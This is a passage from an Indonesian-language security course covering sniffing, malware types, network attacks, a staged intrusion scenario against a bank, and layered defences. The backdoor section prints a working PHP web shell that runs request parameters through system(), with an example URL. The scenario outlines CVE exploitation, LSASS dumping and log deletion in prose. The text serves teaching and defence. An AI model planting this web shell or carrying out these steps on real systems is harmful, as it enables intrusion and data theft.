- **Cara kerja**: ARP spoofing, DHCP starvation, MAC flooding
- **Contoh**: ARP spoofing untuk MITM, switch spanning tree manipulation

```
Attacker (via ARP spoofing)
         ├─→ Victim1
         ├─→ Gateway
         └─→ Victim2
         
Attacker menerima semua traffic antar Victim dan Gateway
```

### 5.4.5 Tools Sniffing Populer

| Tool | Platform | Fungsi |
|------|----------|--------|
| **Wireshark** | Windows, Linux, macOS | GUI packet analyzer |
| **tcpdump** | Linux, Unix | CLI packet capture |
| **Ettercap** | Linux, Windows | MITM dan sniffing |
| **Cain & Abel** | Windows | Password recovery, sniffing |
| **Aircrack-ng** | Linux | Wireless sniffing |
| **Kismet** | Linux | Wireless network detection |

### 5.4.6 Apa yang Bisa Disadap dengan Sniffing

**Tanpa Enkripsi (HTTP, Telnet, FTP):**
```
Username: admin
Password: MySecretPass123
Credit Card: 4532-1111-2222-3333
```

**Dengan Enkripsi (HTTPS, SSH, VPN):**
```
[Encrypted data - tidak bisa dibaca]
[Random looking bytes]
[Gibberish without decryption key]
```

### 5.4.7 Informasi yang Sering Disadap

1. **Credentials**: Username dan password
2. **Financial data**: Nomor kartu kredit, rekening bank
3. **Personal information**: Email, nomor telepon, alamat
4. **Session tokens**: Session IDs, cookies
5. **Files**: Data transfer via FTP, Samba
6. **Communications**: Email content, chat messages
7. **Network topology**: IP addresses, DNS queries
8. **Application behavior**: User behavior, patterns

### 5.4.8 Perlindungan terhadap Sniffing

#### Network Level:
- **Enkripsi komunikasi**: HTTPS, SSH, VPN, IPSec
- **Port security**: Prevent MAC flooding
- **VLAN segmentation**: Isolate traffic
- **Switch security**: Spanning tree protection
- **Network monitoring**: Detect unusual traffic

#### Application Level:
- **HTTPS (SSL/TLS)**: Enkripsi web traffic
- **SSH**: Secure remote access
- **VPN**: Encrypted tunnel
- **TLS/SSL on all services**: Encrypt semua komunikasi
- **Data encryption**: Encrypt sensitive data at rest

#### User Level:
- **Awareness training**: Recognize spoofed emails/websites
- **Use VPN on public WiFi**: Protect from sniffing
- **Verify HTTPS certificate**: Check for self-signed certificates
- **Multi-factor authentication**: Reduce credential theft impact
- **Strong passwords**: Reduce brute force risk

#### Detection:
- **IDS/IPS**: Detect spoofing attempts
- **Network monitoring tools**: Identify unusual traffic patterns
- **Log analysis**: Review access logs
- **Honeypots**: Detect attackers

**Contoh Sniffing dengan Wireshark:**
```
Frame 1: 192.168.1.1 → 10.0.0.1
  Protocol: HTTP
  Info: GET /login HTTP/1.1
  Payload: username=admin&password=secret123 ← VISIBLE!

Frame 2: 192.168.1.2 → 10.0.0.2
  Protocol: TLS 1.3
  Info: Application Data
  Payload: [Encrypted - Cannot read] ✓
```

---

## 6.1 Malware dan Exploit - Pengertian Dasar

### 6.1.1 Pengertian Malware

**Malware** (Malicious Software) adalah perangkat lunak yang dirancang untuk masuk, merusak, atau mengeksploitasi sistem komputer tanpa persetujuan pemilik. Malware adalah istilah umbrella yang mencakup berbagai jenis software berbahaya.

**Karakteristik Malware:**
- Dirancang dengan maksud buruk/jahat
- Tanpa persetujuan atau knowledge dari user
- Merusak, mencuri, atau mengganggu sistem
- Sulit dideteksi dan dihapus
- Dapat menyebar ke sistem lain

### 6.1.2 Pengertian Exploit

**Exploit** adalah teknik atau code yang memanfaatkan vulnerability (kelemahan) spesifik dalam software atau sistem untuk mendapatkan akses tidak sah atau eksekusi code yang tidak diinginkan.

**Karakteristik Exploit:**
- Memanfaatkan security hole yang dikenal
- Targeted dan spesifik untuk vulnerability tertentu
- Dapat digunakan untuk deliver malware
- Zero-day exploit: exploit untuk vulnerability yang belum diketahui vendor
- 1-day exploit: exploit untuk vulnerability yang sudah dipatch

---

## 6.2 Jenis-jenis Malware

### 6.2.1 Virus

**Pengertian**: Program yang mereplikasi diri sendiri dengan menyisipkan code ke file atau program lain.

**Karakteristik:**
- Memerlukan aksi user untuk berkembang (double-click file)
- Mereplikasi diri ke file dan boot sector
- Dapat corrupt atau menghapus data
- Sulit dihapus karena tersebar di banyak file

**Cara Kerja:**
```
1. User download atau menerima file yang infected
2. User menjalankan file tersebut (trigger)
3. Virus code dieksekusi
4. Virus menyisipkan diri ke file lain di system
5. Virus menyebar ketika user membuka file yang di-infect
6. Virus melakukan payload (corrupt data, menampilkan pesan, dll)
```

**Contoh:**
- Melissa Virus (1999): Email worm yang menginfeksi ribuan komputer
- ILOVEYOU Virus (2000): Menghapus file multimedia
- Conflicker Virus (2008): Infect jutaan Windows PCs

**Perlindungan:**
- Antivirus software dengan virus definitions update
- Email filtering
- Don't open suspicious attachments
- Regular backups
- Keep OS dan software updated

---

### 6.2.2 Worm

**Pengertian**: Program self-replicating yang menyebar melalui jaringan tanpa perlu file host.

**Perbedaan dari Virus:**
- Tidak perlu file host untuk berkembang
- Menyebar otomatis melalui jaringan
- Tidak perlu aksi user
- Lebih cepat menyebar

**Cara Kerja:**
```
1. Worm masuk ke sistem (via email, download, vulnerability)
2. Worm mengaktifkan diri secara otomatis
3. Worm mencari sistem lain yang vulnerable di network
4. Worm menyisipkan diri ke sistem target
5. Proses repeat ke sistem lain
6. Worm melakukan payload (consume bandwidth, data theft, dll)
```

**Contoh:**
- Morris Worm (1988): First internet worm, crash ribuan komputer
- SQL Slammer (2003): Exploit SQL Server, slow down internet significantly
- Conficker Worm (2008): Self-replicating, difficult to remove
- Stuxnet (2010): Target SCADA systems, highly sophisticated

**Perlindungan:**
- Network segmentation untuk isolasi infected systems
- Firewall dengan intrusion detection
- Regular security patches
- Disable unnecessary services
- Monitor network traffic
- IDS/IPS untuk detect anomalous behavior

---

### 6.2.3 Trojan / Trojan Horse

**Pengertian**: Program yang terlihat legitimate tapi sebenarnya mengandung hidden malicious code.

**Cara Kerja:**
```
Attacker ─→ Disguise malware as useful program
                ↓
            User download dan install (thinking it's legitimate)
                ↓
            Trojan secretly opens backdoor untuk attacker
                ↓
            Attacker access system dan steal data/install malware
```

**Jenis-jenis Trojan:**
- **Remote Access Trojan (RAT)**: Full remote control atas sistem
- **Backdoor Trojan**: Create hidden access point
- **Downloader**: Download dan install malware lain
- **Infostealer**: Steal passwords, documents, financial info
- **Banking Trojan**: Target online banking credentials

**Contoh:**
- Zeus Trojan: Steal banking credentials, infect millions
- Emotet: Multi-stage malware, download malware dan ransomware
- Qbot: Steal banking info dan PII
- Poison Ivy: RAT yang popular di criminals

**Perlindungan:**
- Download hanya dari official sources
- Antivirus dengan heuristic detection
- User awareness training
- Disable autorun features
- Monitor outbound connections
- Behavioral analysis tools

---

### 6.2.4 Ransomware

**Pengertian**: Malware yang encrypt data dan demand pembayaran untuk unlock.

**Cara Kerja:**
```
1. Ransomware masuk ke sistem (email, exploit, RDP brute force)
2. Ransomware scan disk untuk valuable files
3. File diencrypt dengan strong encryption (AES-256)
4. Attacker menghapus shadow copies dan backups
5. Ransom note ditampilkan dengan instruksi pembayaran
6. User tidak bisa access files sampai bayar
```

**Jenis Ransomware:**
- **Crypto-Ransomware**: Encrypt files (paling berbahaya)
- **Locker Ransomware**: Lock desktop/sistem, user tidak bisa access
- **Scareware**: Fake antivirus warning, demand payment
- **Double Extortion**: Encrypt data + threaten publish data

**Contoh:**
- WannaCry (2017): Exploit EternalBlue, infect 200,000+ PCs worldwide
- NotPetya (2017): Masquerade ransomware, destroy data
- Ryuk (2018): Target enterprise, demand millions of USD
- Ransomware-as-a-Service (RaaS): Attacker rent ransomware

**Perlindungan:**
- Regular backups offline (air-gapped)
- Disable RDP atau protect dengan strong credentials
- Email filtering dan user training
- Regular patching (critical vulnerabilities)
- IDS/IPS monitoring
- EDR (Endpoint Detection Response) tools
- Disable unnecessary services
- Network segmentation

---

### 6.2.5 Spyware

**Pengertian**: Software yang secretly monitor aktivitas user dan collect informasi tanpa consent.

**Cara Kerja:**
```
1. Spyware install (bundled dengan free software, malicious website)
2. Spyware monitor user aktivities:
   - Website visited
   - Keystroke (keylogger)
   - Screenshots
   - Emails dan passwords
   - Bank transactions
3. Attacker collect data via command & control server
4. Data dijual atau digunakan untuk fraud/identity theft
```

**Jenis Spyware:**
- **Keylogger**: Record setiap keystroke user
- **Screenshotter**: Capture screenshots
- **Password Stealer**: Steal credentials dari browser
- **Adware**: Display unwanted advertisements
- **Browser Hijacker**: Redirect browser traffic

**Contoh:**
- WebSearch atau Bonzi Buddy: Early aggressive adware
- CoolWebSearch: Hijack browser homepage
- Infosecure: Fake security software scareware
- Pegasus (mobile): Spy on mobile devices, Saudi Arabian govt

**Perlindungan:**
- Antispyware tools dengan regular updates
- Browser extensions untuk block tracking
- Avoid suspicious websites
- Don't download dari untrusted sources
- Disable macros di documents
- Regular system scans
- Privacy browser settings

---

### 6.2.6 Rootkit

**Pengertian**: Set of tools yang give attacker root/administrator access, stay hidden, dan maintain persistent access.

**Cara Kerja:**
```
1. Exploit atau social engineering deliver rootkit
2. Rootkit install dengan privilege tinggi (kernel level)
3. Rootkit hide dari detection tools:
   - Modify OS functions
   - Hide processes, files, registry
   - Disable antivirus/security tools
4. Attacker maintain hidden backdoor access
5. Sulit dideteksi karena operate di kernel level
```

**Jenis Rootkit:**
- **Kernel Rootkit**: Modify kernel code, very dangerous
- **Hypervisor Rootkit**: Run di virtual machine level
- **Bootkit**: Infect bootloader, remain even after reboot
- **Library Rootkit**: Modify system libraries

**Contoh:**
- Sony BMG Rootkit (2005): Music CDs contained rootkit for DRM
- Blackhole Rootkit: Create botnet dari infected systems
- TDL4 Rootkit: Kernel-mode rootkit, difficult to remove
- Alureon Rootkit: Steal banking credentials

**Perlindungan:**
- Regular security patches untuk OS
- Behavior monitoring tools
- HIPS (Host-based Intrusion Prevention)
- Secure boot dengan signed kernel
- Integrity checking (file hash monitoring)
- Read-only filesystem untuk critical files
- System integrity verification tools

---

### 6.2.7 Backdoor

**Pengertian**: Hidden entry point dalam sistem yang memungkinkan attacker akses unauthorized.

**Cara Kerja:**
```
1. Attacker create atau install backdoor via:
   - Trojan atau worm
   - Exploit vulnerability
   - Weak credentials (default password)
   - Social engineering
2. Backdoor remain active dan hidden
3. Attacker bisa akses system kapan saja
4. Sulit detect karena legitimize port atau service
```

**Jenis Backdoor:**
- **Hardware Backdoor**: Embedded di firmware/hardware
- **Software Backdoor**: Code dalam aplikasi
- **Web Shell**: Upload script ke web server untuk remote access
- **Reverse Shell**: Infected system connect back ke attacker

**Contoh Web Shell:**
```php
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```
Attacker akses dengan: `http://victim.com/shell.php?cmd=whoami`

**Contoh:**
- APT backdoors: Sophisticated backdoors di government systems
- Lazarus Backdoor: North Korea linked group
- Turla Backdoor: Steal classified Russian documents

**Perlindungan:**
- Regular file integrity checking
- Web shell detection tools
- Disable file upload functionality
- Input validation dan sanitization
- Access control untuk file/directories
- Monitor suspicious connections
- Incident response procedures

---

## 6.3 Network-based Threats dan Attacks

### 6.3.1 Proxy Poisoning

**Pengertian**: Attack yang memodifikasi proxy responses atau cache untuk deliver malicious content ke users.

**Cara Kerja:**
```
1. Attacker compromise proxy server atau intercept traffic
2. Attacker modify response dari legitimate server
3. Modified response contain malware atau phishing content
4. User receive compromised content dari trusted proxy
5. User download malware atau visit fake login page
```

**Jenis Proxy Poisoning:**
- **Cache Poisoning**: Inject fake content ke proxy cache
- **Proxy Hijacking**: Redirect traffic melalui attacker proxy
- **SSL Stripping**: Remove HTTPS untuk intercept traffic

**Perlindungan:**
- Use trusted proxies only
- HTTPS enforcement (prevent SSL stripping)
- Certificate pinning
- Verify TLS certificates
- Proxy whitelisting
- Network monitoring untuk detect anomalies

---

### 6.3.2 DDoS (Distributed Denial of Service)

**Pengertian**: Attack yang mengirim traffic sangat besar dari banyak sources untuk overwhelm target server.

**Perbedaan DOS dan DDOS:**
- **DOS**: Single source attack
- **DDOS**: Multiple sources (botnet) attack

**Cara Kerja:**
```
1. Attacker compromise thousands computers (create botnet)
2. Attacker issue command ke botnet untuk attack target
3. Botnet flood target dengan traffic
4. Target server overwhelmed, tidak bisa handle legitimate requests
5. Service down atau respond very slowly
6. Attacker demand ransom atau disrupt competitors
```

**Jenis DDOS Attack:**
- **Volumetric Attack**: Flood dengan traffic huge (SYN flood, UDP flood)
- **Protocol Attack**: Exploit protokol weakness (Ping of Death, Fragmented Packets)
- **Application Attack**: Target aplikasi (HTTP flood, Slowloris)

**Contoh:**
- Mirai Botnet (2016): IoT devices attack Dyn DNS, destroy internet East Coast USA
- GitHub DDOS (2018): 1.35 Tbps traffic
- AWS Shield report: 600 Gbps attack

**Perlindungan:**
- DDOS mitigation service (Cloudflare, Akamai)
- Rate limiting
- Traffic filtering
- Anycast network routing
- Load balancing
- ISP filtering
- Over-provision bandwidth
- IDS/IPS dengan signature untuk known DDOS attacks

---

### 6.3.3 Botnet

**Pengertian**: Network dari compromised computers (bots) yang controlled remotely oleh attacker (botmaster).

**Cara Kerja:**
```
1. Attacker infect computers dengan malware (worm, trojan)
2. Infected computers automatically connect ke Command & Control (C&C) server
3. Botmaster send commands ke all bots
4. Bots execute commands (send spam, DDOS, mine cryptocurrency, dll)
5. Attacker dapat control ribuan atau jutaan bots
```

**Botnet Architecture:**
- **Centralized**: All bots connect ke single C&C server
  - Advantage: Easy to control
  - Disadvantage: Easy to shutdown bila C&C down
  
- **Peer-to-Peer (P2P)**: Bots connect ke other bots
  - Advantage: Resilient, difficult to shutdown
  - Disadvantage: Complex untuk manage

**Contoh Botnet:**
- Mirai: IoT botnet, 600,000+ devices
- Emotet: Largest botnet, 1.2 million infected systems
- Necurs: Largest P2P botnet, 5 million+ infected
- Conficker: 7 million infected computers, difficult to remove

**Activities Botnet:**
- Send spam emails
- Perform DDOS attacks
- Host phishing websites
- Mine cryptocurrency
- Steal data via keylogger
- Propagate other malware

**Perlindungan:**
- Antivirus dengan real-time protection
- Network monitoring untuk detect C&C communications
- Firewall blocking known C&C servers
- Regular system updates
- Port security
- EDR tools
- User awareness training

---

### 6.3.4 Man-in-the-Middle (MITM) Attack

**Pengertian**: Attacker intercept komunikasi antara 2 parties untuk spy, modify, atau inject data.

**Cara Kerja MITM via ARP Spoofing:**
```
Normal communication:
Client ←→ Gateway ←→ Internet

MITM Attack:
Client ←→ Attacker ←→ Gateway ←→ Internet
         (impersonate both sides)

Attacker receive SEMUA traffic, bisa:
- Monitor komunikasi
- Modify data
- Inject malicious content
- Steal credentials
```

**Contoh MITM Attacks:**
1. **ARP Spoofing MITM**: Intercept local network traffic
2. **DNS Spoofing MITM**: Redirect ke fake website
3. **SSL Stripping**: Remove HTTPS protection
4. **Session Hijacking**: Steal session cookies

**Real-world Example:**
```
User: Akses bank.com HTTPS
Attacker (MITM): Intercept, downgrade ke HTTP
Bank server: Normal response
User: Lihat HTTP (tidak HTTPS), tapi karena attacker relay dengan baik,
      user tidak suspicious
User login: Attacker capture username/password
```

**Perlindungan:**
- Use HTTPS everywhere (enforce HTTP → HTTPS redirect)
- Certificate pinning di mobile apps
- HSTS (HTTP Strict Transport Security)
- VPN untuk public WiFi
- ARP monitoring untuk detect spoofing
- Mutual authentication
- 2FA untuk prevent credential misuse

---

### 6.3.5 VPN (Virtual Private Network) dan Masquerade

**Pengertian VPN**: Encrypted tunnel yang protect komunikasi dari sniffing dan tampil seolah-olah dari IP berbeda.

**Legitimate Uses:**
- Privacy: Hide IP address dari ISP dan websites
- Security: Encrypt traffic pada public WiFi
- Bypass: Access regional content, bypass censorship
- Remote work: Secure access ke corporate network

**Malicious Uses of VPN:**
- Attacker use VPN untuk hide real IP address
- Evade detection dari security tools
- Bypass geolocation filtering
- Hide dari law enforcement

**Perlindungan:**
- VPN adalah tool neutral (like knife - bisa untuk baik atau jahat)
- Monitor suspicious VPN usage in corporate network
- Detect VPN traffic dengan DPI (Deep Packet Inspection)
- Restrict VPN usage via firewall policies

---

## 6.4 Attack Chain - Cara Attacker Masuk dan Establish Persistence

### 6.4.1 Typical Attack Flow

```
┌─────────────────────────────────────────────────────────────┐
│          CYBER KILL CHAIN - Attack Flow Model               │
└─────────────────────────────────────────────────────────────┘

STEP 1: RECONNAISSANCE
┌─────────────────────┐
│ Information         │
│ Gathering           │
│ • OSINT             │
│ • Port Scanning     │
│ • Vulnerability     │
│   Assessment        │
└──────────┬──────────┘
           ↓
    Target Identified
        
STEP 2: INITIAL ACCESS  ┌─────────────────────┐
┌─────────────────────┐  │ Attacker enters     │
│ • Exploit vuln      │─→│ Target Network      │
│ • Phishing email    │  │ First Foothold      │
│ • Social engr.      │  │ "I'm IN!"           │
│ • Weak creds        │  └─────────────────────┘
└──────────┬──────────┘
           ↓
┌─────────────────────┐
│ PERSISTENCE         │
│ • Hidden backdoor   │
│ • Scheduled task    │
│ • Rootkit           │
│ • Reverse shell     │
└──────────┬──────────┘
           ↓
┌─────────────────────┐
│ PRIVILEGE ESCALATION│
│ • Kernel exploit    │
│ • Token impersonate │
│ • Stolen creds      │
│ • Sudo misconfig    │
└──────────┬──────────┘
           ↓
┌─────────────────────┐
│ DEFENSE EVASION     │
│ • Disable AV        │
│ • Hide processes    │
│ • Delete logs       │
│ • Encrypt C2 traffic│
└──────────┬──────────┘
           ↓
┌─────────────────────┐
│ CREDENTIAL ACCESS   │
│ • Keylogger         │
│ • LSASS dump        │
│ • Brute force       │
│ • DB credential     │
└──────────┬──────────┘
           ↓
┌─────────────────────┐
│ DISCOVERY           │
│ • Network mapping   │
│ • User enumeration  │
│ • Permission check  │
│ • Valuable data ID  │
└──────────┬──────────┘
           ↓
┌─────────────────────┐
│ LATERAL MOVEMENT    │
│ • Pass-the-hash     │
│ • Trust exploitation│
│ • Pivot systems     │
│ • Expand access     │
└──────────┬──────────┘
           ↓
┌─────────────────────┐
│ EXFILTRATION        │
│ • Data compression  │
│ • Encryption        │
│ • Slow transfer     │
│ • C2 channel        │
└──────────┬──────────┘
           ↓
┌─────────────────────┐
│ IMPACT              │
│ • Ransomware enc    │
│ • Data deletion     │
│ • System crash      │
│ • Ransom demand     │
└─────────────────────┘

TIMELINE: Weeks to Months
DETECTION DIFFICULTY: Very High (Advanced attacker)
IMPACT: Critical - Business operations halted
```

**Network Compromise Visualization:**
```
DAY 1: Initial Access                    WEEK 2: Full Compromise
┌─────────────┐                         ┌──────────────────────┐
│ Web Server  │ EXPLOIT                 │  Full Network Access │
│ Port 80/443 │◄──── Vulnerable         │                      │
│  BREACHED   │      (Unpatched)        │ • Domain Admin       │
└─────────────┘                         │ • File Servers       │
      │                                 │ • Database           │
      ↓ (Lateral Movement)              │ • Email              │
┌─────────────┐                         │ • Backup systems     │
│ File Server │ (Pivot via web)         │ • Everything!        │
│  INFECTED   │                         └──────────────────────┘
└─────────────┘                                     │
      │                                             ↓
      ↓                                    WEEK 3: Ransom Demand
┌─────────────┐                         ┌──────────────────────┐
│  Database   │ (Admin credentials)     │ All Files Encrypted  │
│  RANSOMED   │                         │ "Pay $500K or data   │
└─────────────┘                         │  will be published"  │
                                        └──────────────────────┘
```

1. RECONNAISSANCE
   ├─ Information Gathering
   │  ├─ OSINT (Open Source Intelligence)
   │  ├─ Port scanning
   │  ├─ Vulnerability assessment
   │  └─ Social engineering research
   └─ Attacker compile list dari vulnerable systems

2. INITIAL ACCESS
   ├─ Exploit vulnerability (unpatched software)
   ├─ Social engineering (phishing email, pretexting)
   ├─ Weak credentials (default password, brute force)
   ├─ Supply chain attack (compromise vendor)
   └─ Physical access atau insider threat

3. PERSISTENCE
   ├─ Install backdoor untuk maintain access
   ├─ Create user account atau schedule task
   ├─ Modify boot sector atau firmware
   ├─ Rootkit installation
   └─ Reverse shell untuk remote access

4. PRIVILEGE ESCALATION
   ├─ Local privilege escalation (elevate dari user ke admin)
   ├─ Kernel exploit untuk escalate ke system/kernel level
   ├─ Token impersonation atau stolen credentials
   └─ Exploit misconfigurations

5. DEFENSE EVASION
   ├─ Disable antivirus atau firewall
   ├─ Hide malware dalam legitimate process
   ├─ Remove logs untuk hide activity
   ├─ Rootkit untuk hide presence
   └─ C2 communication encryption untuk evade detection

6. CREDENTIAL ACCESS
   ├─ Keylogger untuk capture passwords
   ├─ Dump password hashes dari memory
   ├─ LSASS process memory dump
   ├─ Credential theft dari browsers
   └─ Brute force atau dictionary attack

7. DISCOVERY
   ├─ Enumerate users, groups, permissions
   ├─ Map network topology
   ├─ Identify valuable systems dan data
   ├─ Check security tools present
   └─ Lateral movement opportunities

8. LATERAL MOVEMENT
   ├─ Use stolen credentials
   ├─ Exploit trust relationships antar systems
   ├─ Pass-the-hash atau pass-the-ticket attack
   ├─ Pivot melalui compromised system
   └─ Access sensitive network segments

9. EXFILTRATION
   ├─ Data compression
   ├─ Encryption data
   ├─ Slow exfil untuk avoid detection
   ├─ Use C2 channel atau separate channel (DNS tunneling, etc)
   └─ Delete traces

10. IMPACT
    ├─ Ransomware encryption
    ├─ Data deletion atau modification
    ├─ Deploy malware ke critical systems
    ├─ Destroy backups
    └─ Demand ransom atau publish data

### 6.4.2 Contoh Attack Scenario - Dari Awal Sampai Compromise

**Scenario: Attacker target Financial Company**

**Phase 1: Reconnaissance (1-2 weeks)**
```
Attacker:
1. Cari info via Google, LinkedIn, public databases
   - Find employees: John@bank.com
   - Find software: Bank use Windows Server 2016, outdated
   - Find vendors: Bank use Citrix, known vulnerabilities
2. Check company website, DNS records, IP ranges
3. Search vulnerability database untuk known CVE
4. Monitor social media untuk security practices
```

**Phase 2: Initial Access (1 week)**
```
Attacker choice 1 - Phishing:
1. Create legitimate-looking email: "Password Reset Required"
2. Send ke employees dengan malicious link atau attachment
3. Employee click → malware download
4. Executable run → trojan installed
5. Trojan create reverse shell connection ke attacker

Attacker choice 2 - Exploit:
1. Find Citrix CVE-2019-19781 vulnerability
2. Direct exploit ke Citrix server
3. Gain code execution
4. Upload webshell
```

**Phase 3: Persistence (1-2 days)**
```
Attacker:
1. Create hidden admin account: "sysadmin123" password "P@ssw0rd123"
2. Install backdoor di C:\Windows\System32\svchost.exe
3. Create scheduled task "WindowsUpdate" yang jalankan backdoor setiap 5 menit
4. Install rootkit untuk hide persistence mechanisms
5. Disable Windows Defender real-time monitoring
6. Configure WinRM untuk remote PowerShell access
```

**Phase 4: Privilege Escalation (1-2 days)**
```
Attacker:
1. Run automated privilege escalation exploit: CVE-2016-7255
2. Kernel exploit successful → SYSTEM access
3. Now attacker = SYSTEM level privileges
4. Dump LSASS memory untuk extract password hashes
5. Extract domain admin hash dari cached credentials
```

**Phase 5: Defense Evasion (ongoing)**
```
Attacker:
1. Kill antivirus processes
2. Modify Windows Defender signatures
3. Delete Event Logs setiap 6 jam
4. Hide malware dalam System processes (csrss.exe, svchost.exe)
5. Rootkit hook system calls untuk hide backdoor processes
6. C2 communication encrypt dan use HTTPS + DNS tunneling
```

**Phase 6: Credential Access (2-3 days)**
```
Attacker:
1. Install keylogger di compromised workstation
2. Capture domain admin login: adminuser / ComplexPass#2024!
3. Use Mimikatz untuk dump LSASS memory
4. Extract cleartext passwords dari credential manager
5. Brute force weak passwords untuk vendor accounts
```

**Phase 7: Lateral Movement (3-5 days)**
```
Attacker:
1. Use stolen admin credentials
2. Scan network: nmap untuk find other systems
3. Find domain controller DC01 192.168.1.100
4. Use Pass-the-Hash attack dengan stolen NTLM hash
5. Gain access ke domain controller
6. Now attacker = Domain admin → full network access
7. Find database server 10.0.1.50 dari domain admin lateral movement
```

**Phase 8: Exfiltration (1 week, slow exfil)**
```
Attacker:
1. Identify valuable data:
   - Customer database (millions of records)
   - Internal financial documents
   - Trading algorithms
2. Compress 500GB data ke smaller files
3. Encrypt data dengan AES-256
4. Establish separate C2 channel (encrypted tunnel)
5. Send 10GB per day untuk avoid detection
6. Use legitimate protocols (HTTPS, DNS) untuk hide exfil
7. Attacker delete logs, backup logs, shadow copies
8. Delete evidence dari workstations
```

**Phase 9: Impact - Demand Ransom**
```
Attacker:
1. Deploy ransomware ke critical systems:
   - Database servers
   - File servers
   - Virtual machines
2. Files get encrypted dengan attacker's public key
3. Attacker send ransom note:
   "Your files encrypted. Pay 5 Bitcoin (= $200,000 USD) ke address...
    Payment deadline: 72 hours or double the price. 
    Proof: attacker show stolen sensitive data photos"
4. Company paralyzed:
   - Cannot access customer records
   - Trading systems down
   - Operations halt
5. Company forced negotiate atau pay ransom
```

---

## 6.5 Comprehensive Defense dan Mitigation Strategies

### 6.5.1 Defense in Depth Strategy

Defense in Depth = Multiple layers proteksi sehingga jika satu layer breach, masih ada layer lain.

```
Layer 1: PERIMETER DEFENSE
├─ Firewall (stateful, NGFW)
├─ IDS/IPS (intrusion detection/prevention)
├─ DDOS mitigation
├─ Web Application Firewall (WAF)
└─ Proxy filtering

Layer 2: NETWORK DEFENSE
├─ Network segmentation (VLAN, subnets)
├─ Access control lists (ACLs)
├─ Port security
├─ VLAN hopping prevention
└─ MAC filtering

Layer 3: ENDPOINT DEFENSE
├─ Antivirus / Antimalware
├─ EDR (Endpoint Detection Response)
├─ Host-based firewall
├─ HIPS (Host Intrusion Prevention)
├─ DLP (Data Loss Prevention)
└─ File integrity monitoring

Layer 4: APPLICATION DEFENSE
├─ Input validation
├─ Secure coding practices
├─ WAF untuk aplikasi
├─ Patching dan updates
├─ Error handling
└─ Logging dan monitoring

Layer 5: DATA DEFENSE
├─ Encryption at rest (AES-256)
├─ Encryption in transit (TLS 1.3)
├─ Access control (RBAC, ABAC)
├─ Data classification
├─ DLP (Data Loss Prevention)
└─ Regular backups

Layer 6: IDENTITY & ACCESS DEFENSE
├─ Strong authentication (MFA, 2FA)
├─ Password policies
├─ Session management
├─ Privilege management (PAM)
├─ Least privilege principle
└─ Access reviews

Layer 7: MONITORING & DETECTION
├─ SIEM (Security Information Event Management)
├─ Log aggregation
├─ Threat hunting
├─ Anomaly detection
├─ Alert & response
└─ Incident response team
```

### 6.5.2 Specific Defenses untuk Setiap Threat

#### **Perlindungan Malware (Virus, Worm, Trojan, Ransomware)**

**Prevention:**
1. **Patching dan Updates** (CRITICAL)
   - Patch OS vulnerabilities dalam 30 hari (critical)
   - Auto-update untuk browser, Java, Flash
   - Patch management system dengan testing
   
2. **Antivirus / Antimalware**
   - Real-time scanning
   - Heuristic detection untuk unknown malware
   - Regular signature updates (daily)
   - Quarantine suspicious files
   - Tools: Kaspersky, Bitdefender, Windows Defender, etc

3. **Email Security**
   - Email filtering (block suspicious attachments)
   - Link scanning (URL reputation checking)
   - Sandbox execution testing
   - DMARC/SPF/DKIM untuk prevent spoofing
   
4. **Application Control**
   - Whitelist allowed applications
   - Prevent execution dari temporary/download folders
   - Disable autorun features
   
5. **User Awareness**
   - Training tentang phishing, social engineering
   - Regular security awareness program
   - Reporting mechanism untuk suspicious emails

**Detection:**
1. **EDR (Endpoint Detection & Response)**
   - Monitor process behavior
   - Detect suspicious API calls
   - Alert pada malware-like activities
   - Tools: CrowdStrike, Carbonblack, Microsoft Defender ATP

2. **Network Monitoring**
   - IDS untuk detect known malware signatures
   - C2 detection (unusual outbound connections)
   - Botnet detection
   - Tools: Snort, Suricata, Zeek

3. **File Integrity Monitoring**
   - Monitor critical files
   - Alert pada unexpected changes
   - Tools: Tripwire, AIDE

**Response:**
1. Isolate infected systems dari network
2. Kill malicious processes
3. Remove malware files
4. Restore dari clean backup
5. Re-image OS jika necessary (especially ransomware, rootkit)
6. Change all passwords
7. Check untuk lateral movement signs

---

#### **Perlindungan Network Threats (Spoofing, Sniffing, MITM, DDOS, Botnet)**

**Prevention & Detection:**

| Threat | Prevention | Detection |
|--------|-----------|-----------|
| **ARP Spoofing** | Port security, DAI (Dynamic ARP Inspection), Static ARP untuk servers | ARP monitoring tools, Wireshark |
| **IP Spoofing** | Ingress/egress filtering, RPF (Reverse Path Forwarding) | IDS/IPS signatures, NetFlow analysis |
| **DNS Spoofing** | DNSSEC, DNS filtering, trusted DNS servers | DNS query monitoring, DNSSEC validation |
| **Sniffing** | HTTPS enforcement, SSH, VPN, encrypted protocols | HTTPS monitoring, traffic analysis |
| **MITM** | HTTPS + certificate pinning, mutual authentication, VPN | Certificate validation, traffic anomalies |
| **DDOS** | Rate limiting, traffic filtering, DDOS mitigation service | Traffic spike detection, NetFlow analysis |
| **Botnet C2** | Firewall block known C&C IPs, DNS filtering | C2 detection tools, network monitoring |

**Specific Defense Measures:**

1. **Firewall Configuration**
   ```
   # Default deny (implicit deny)
   Block all by default
   
   # Allow only necessary traffic
   Allow HTTP from any to web servers port 80
   Allow HTTPS from any to web servers port 443
   Allow SSH from admin networks to servers port 22
   
   # Block known bad
   Block known botnet C&C IPs
   Block known DDOS ranges
   ```

2. **Network Segmentation**
   ```
   DMZ:
   - Web servers accessible dari internet
   - Limited access dari internal network
   
   Internal:
   - Database servers isolated
   - Only web servers can access DB
   - Admin access via bastion host
   
   Guest:
   - Completely isolated dari internal
   - Limited Internet access only
   ```

3. **VPN untuk Secure Communication**
   - IPSec site-to-site VPN untuk branch connections
   - SSL VPN untuk remote access
   - Force HTTPS + VPN untuk sensitive data access

4. **DDOS Mitigation**
   - Over-provision bandwidth
   - Use CDN untuk absorb attack traffic
   - Rate limiting di firewall
   - Anycast routing untuk distribute attack
   - DDOS mitigation service (Cloudflare, Akamai, AWS Shield)

5. **C2 Detection & Blocking**
   - Proxy dengan malware filtering
   - DNS sinkhole untuk malicious domains
   - IDS/IPS dengan botnet signatures
   - Behavioral analysis untuk unknown C2
   - SIEM correlation untuk detect C2 patterns

---

#### **Perlindungan Privilege Escalation**

**Prevention:**
1. **Patch Management** - Critical kernel updates, 0-day detection
2. **Privilege Management** (PAM - Privileged Access Management)
   - Just-In-Time (JIT) access - only when needed
   - Session recording untuk admin access
   - Approval workflow untuk privilege escalation
3. **OS Hardening**
   - Minimize installed services
